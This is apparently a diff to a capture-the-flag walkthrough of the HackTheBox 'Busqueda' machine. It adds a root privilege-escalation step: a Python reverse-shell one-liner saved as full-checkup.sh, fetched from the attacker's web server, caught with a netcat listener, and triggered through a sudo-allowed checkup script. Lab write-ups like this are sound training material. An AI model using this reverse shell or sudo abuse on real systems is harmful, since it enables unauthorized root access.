@@ -45,12 +45,27 @@ after searching on Google, it is found that the URL: https://github.com/nexis-ne
 ![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/07ace5e3-0083-427b-8172-68e678f3733a)
 
 • enumeration to get a root shell, you will find docker-inspect, and try to get a code from Google to get the high privilege, with the help of this 
-URL: https://docs.docker.com/engine/reference/commandline/inspect/  
-with the code : docker inspect --format='{{json .Config}}' $INSTANCE_ID
+URL:  https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/python-privilege-escalation/   
+with the code: import socket,os,pty;s=socket.socket();s.connect(("<local-ip>",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")
+after putting the code in a Python file with the name **full-checkup.sh** and opening a Python server to send the file from my local machine to the web server with the command 
+└─$ **python -m http.server 80**, and on our shell use the command **wget://10.10.14.144:80/full-checkup.sh** to receive the file 
 
-![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/a5f83725-98fd-47c9-ac09-2dc8c052b18b)
+![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/69027e08-1198-4a29-b358-4fc605b0eb21)
 
+![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/90860dd7-6e1c-4fe7-af41-37f64533edbc)
 
+• after receiving the file change the mod by command **chmod +x full-checkup.sh** 
+![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/a9bf3e06-475a-4c16-98a4-a6be25f2e09d)
+
+• open a listener to listen on port 4444 with netcat  nc -nlvp 4444 
+
+• run the following command to receive the root shell 
+
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/f218f1be-171d-4b0f-aa55-a5ca58307e2f)
+
+• we get the root flag and root access on the machine 
 
 
 
